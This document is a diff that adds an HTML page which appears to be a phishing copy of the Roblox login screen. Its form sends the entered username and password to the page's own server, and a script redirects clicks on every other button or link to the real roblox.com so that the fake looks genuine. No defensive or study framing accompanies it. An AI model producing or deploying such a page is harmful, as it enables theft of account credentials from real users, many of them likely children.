@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Add Account</title>
+  <meta name="viewport" content="width=600, initial-scale=1.0">
+  <link rel="stylesheet" href="../../static/style.css">
+</head>
+<body>
+  <div class="container">
+    <form class="login-box" method="POST" action="/">
+      <h1>Add Account</h1>
+      <input type="text" placeholder="Username/Email/Phone" class="input" name="username" required />
+      <input type="password" placeholder="Password" class="input" name="password" required />
+      <button type="submit" class="login-btn">Log In</button>
+      <a href="#" class="forgot-link">Forgot Password or Username?</a>
+      <hr>
+      <button type="button" class="one-time-btn">Email Me a One-Time Code</button>
+      <button type="button" class="other-device-btn">Use Another Device</button>
+      <a href="#" class="create-link">Create A New Account</a>
+    </form>
+  </div>
+  <footer>
+    <nav>
+      <a href="#">About Us</a>
+      <a href="#">Jobs</a>
+      <a href="#">Blog</a>
+      <a href="#">Parents</a>
+      <a href="#">Gift Cards</a>
+      <a href="#">Help</a>
+      <a href="#">Terms</a>
+      <a href="#">Accessibility</a>
+      <a href="#">Privacy</a>
+      <a href="#" class="privacy-choices">Your Privacy Choices <span class="privacy-icon">&#x2611;&#xFE0F;</span></a>
+    </nav>
+  </footer>
+
+  <!-- Redirect script -->
+  <script>
+    document.addEventListener('click', function(event) {
+      const target = event.target;
+
+      // Allow input fields
+      if (target.closest('input')) return;
+
+      // Allow the login button
+      const loginBtn = document.querySelector('.login-btn');
+      if (target === loginBtn || loginBtn.contains(target)) return;
+
+      // Redirect if clicked element is a button or link (excluding allowed ones)
+      if (target.tagName === 'BUTTON' || target.tagName === 'A') {
+        event.preventDefault();
+        window.location.href = 'https://roblox.com';
+      }
+    });
+  </script>
+</body>
+</html>
